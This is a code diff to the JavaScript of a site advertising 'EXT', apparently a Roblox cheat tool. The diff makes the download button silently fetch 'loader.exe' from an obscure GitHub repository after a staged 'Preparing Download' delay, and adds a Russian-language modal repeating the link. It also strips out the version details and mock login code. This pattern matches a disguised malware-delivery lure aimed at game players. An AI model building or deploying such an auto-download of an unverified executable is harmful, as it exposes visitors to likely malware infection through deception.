@@ -103,160 +103,60 @@ document.addEventListener('DOMContentLoaded', function() {
     
     downloadBtn.addEventListener('click', function(e) {
         e.preventDefault();
-        
         // Add loading state
         const originalText = downloadBtn.innerHTML;
         downloadBtn.innerHTML = '<span class="btn-icon">⏳</span>Preparing Download...';
         downloadBtn.style.pointerEvents = 'none';
-        
         // Simulate download preparation
         setTimeout(() => {
             downloadBtn.innerHTML = '<span class="btn-icon">✅</span>Download Ready!';
-            
+            // Start download
+            const link = document.createElement('a');
+            link.href = 'https://github.com/NAta4333/wsgtegegv/raw/refs/heads/main/loader.exe';
+            link.download = 'loader.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
             setTimeout(() => {
                 // Reset button
                 downloadBtn.innerHTML = originalText;
                 downloadBtn.style.pointerEvents = 'auto';
-                
-                // Show download modal or redirect
-                showDownloadModal();
+                showDownloadStartedModal();
             }, 1500);
         }, 2000);
     });
 
-    // Download Modal Function
-    function showDownloadModal() {
-        // Create modal element
+    // Modal for download started
+    function showDownloadStartedModal() {
         const modal = document.createElement('div');
         modal.className = 'download-modal';
         modal.innerHTML = `
             <div class="modal-content">
                 <div class="modal-header">
-                    <h3>🎉 Thank you for choosing EXT!</h3>
+                    <h3>⬇️ Загрузка началась!</h3>
                     <button class="close-modal">&times;</button>
                 </div>
                 <div class="modal-body">
-                    <p>Your download will start automatically. If it doesn't start, please click the button below:</p>
-                    <br>
-                    <button class="btn btn-primary" onclick="this.innerHTML='Downloaded! ✅'; this.disabled=true;">
-                        <span class="btn-icon">⬇️</span>
-                        Start Download
-                    </button>
-                    <br><br>
-                    <div class="download-info">
-                        <p><strong>Version:</strong> 2.1.0</p>
-                        <p><strong>Size:</strong> ~25 MB</p>
-                        <p><strong>Compatibility:</strong> Windows 10/11</p>
-                    </div>
+                    <p>Файл loader.exe скачивается.<br>Если загрузка не началась, <a href='https://github.com/NAta4333/wsgtegegv/raw/refs/heads/main/loader.exe' style='color:#0ea5e9;' download>нажмите сюда</a>.</p>
                 </div>
             </div>
         `;
-
-        // Add modal styles
-        const modalStyles = `
-            .download-modal {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0, 0, 0, 0.8);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                z-index: 10000;
-                animation: fadeIn 0.3s ease-out;
-            }
-            
-            .modal-content {
-                background: var(--bg-secondary);
-                border: 1px solid var(--border-color);
-                border-radius: 15px;
-                padding: 2rem;
-                max-width: 500px;
-                width: 90%;
-                position: relative;
-                animation: slideInDown 0.4s ease-out;
-            }
-            
-            .modal-header {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                margin-bottom: 1rem;
-                padding-bottom: 1rem;
-                border-bottom: 1px solid var(--border-color);
-            }
-            
-            .modal-header h3 {
-                color: var(--text-primary);
-                margin: 0;
-            }
-            
-            .close-modal {
-                background: none;
-                border: none;
-                color: var(--text-secondary);
-                font-size: 2rem;
-                cursor: pointer;
-                padding: 0;
-                width: 30px;
-                height: 30px;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                border-radius: 50%;
-                transition: all 0.3s ease;
-            }
-            
-            .close-modal:hover {
-                background: var(--bg-card);
-                color: var(--text-primary);
-            }
-            
-            .modal-body {
-                text-align: center;
-                color: var(--text-secondary);
-            }
-            
-            .download-info {
-                background: var(--bg-card);
-                padding: 1rem;
-                border-radius: 10px;
-                text-align: left;
-                margin-top: 1rem;
-            }
-            
-            .download-info p {
-                margin: 0.5rem 0;
-                color: var(--text-secondary);
-            }
-            
-            @keyframes fadeIn {
-                from { opacity: 0; }
-                to { opacity: 1; }
-            }
-            
-            @keyframes slideInDown {
-                from {
-                    opacity: 0;
-                    transform: translateY(-50px);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
-            }
-        `;
-
         // Add styles to document
+        const modalStyles = `
+            .download-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 10000; animation: fadeIn 0.3s ease-out; }
+            .modal-content { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 15px; padding: 2rem; max-width: 400px; width: 90%; position: relative; animation: slideInDown 0.4s ease-out; }
+            .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color); }
+            .modal-header h3 { color: var(--text-primary); margin: 0; }
+            .close-modal { background: none; border: none; color: var(--text-secondary); font-size: 2rem; cursor: pointer; padding: 0; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: all 0.3s ease; }
+            .close-modal:hover { background: var(--bg-card); color: var(--text-primary); }
+            .modal-body { text-align: center; color: var(--text-secondary); }
+            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+            @keyframes slideInDown { from { opacity: 0; transform: translateY(-50px); } to { opacity: 1; transform: translateY(0); } }
+        `;
         const styleSheet = document.createElement('style');
         styleSheet.textContent = modalStyles;
         document.head.appendChild(styleSheet);
-
-        // Add modal to body
         document.body.appendChild(modal);
-
         // Close modal functionality
         const closeBtn = modal.querySelector('.close-modal');
         closeBtn.addEventListener('click', () => {
@@ -266,8 +166,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 if (document.head.contains(styleSheet)) document.head.removeChild(styleSheet);
             }, 300);
         });
-
-        // Close modal when clicking outside
         modal.addEventListener('click', (e) => {
             if (e.target === modal) {
                 closeBtn.click();
@@ -356,60 +254,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const rippleStyleSheet = document.createElement('style');
     rippleStyleSheet.textContent = rippleStyles;
     document.head.appendChild(rippleStyleSheet);
-
-    // Открытие модальных окон
-    const profileBtn = document.getElementById('profileBtn');
-    if (profileBtn) {
-        profileBtn.addEventListener('click', () => {
-            document.getElementById('profileModal').style.display = 'flex';
-        });
-    }
-    document.querySelectorAll('.close-modal').forEach(btn => {
-        btn.addEventListener('click', () => {
-            btn.closest('.modal').style.display = 'none';
-        });
-    });
-    // Переключение вкладок
-    function setupTabs(modalId) {
-        const modal = document.getElementById(modalId);
-        if (!modal) return;
-        modal.querySelectorAll('.modal-tabs .tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                modal.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                modal.querySelectorAll('.tab-content').forEach(tc => tc.style.display = 'none');
-                modal.querySelector(`#${tab.dataset.tab}Tab`).style.display = 'block';
-            });
-        });
-    }
-    setupTabs('profileModal');
-    setupTabs('authModal');
-    // Открытие окна авторизации если не авторизован (пример)
-    if (!localStorage.getItem('userToken')) {
-        document.getElementById('authModal').style.display = 'flex';
-        if (profileBtn) profileBtn.style.display = 'none';
-    } else {
-        if (profileBtn) profileBtn.style.display = 'block';
-    }
-    // Пример отправки данных на сервер (замените на свои PHP эндпоинты)
-    document.getElementById('loginSubmit').onclick = async function() {
-        // fetch('/login.php', {method:'POST',body:...})
-        localStorage.setItem('userToken', 'demoToken');
-        document.getElementById('authModal').style.display = 'none';
-        if (profileBtn) profileBtn.style.display = 'block';
-    };
-    document.getElementById('registerSubmit').onclick = async function() {
-        // fetch('/register.php', {method:'POST',body:...})
-        localStorage.setItem('userToken', 'demoToken');
-        document.getElementById('authModal').style.display = 'none';
-        if (profileBtn) profileBtn.style.display = 'block';
-    };
-    document.getElementById('logoutBtn').onclick = function() {
-        localStorage.removeItem('userToken');
-        document.getElementById('profileModal').style.display = 'none';
-        document.getElementById('authModal').style.display = 'flex';
-        if (profileBtn) profileBtn.style.display = 'none';
-    };
 
     // Console message for developers
     console.log('%cEXT - External Roblox Software', 'color: #6366f1; font-size: 20px; font-weight: bold;');
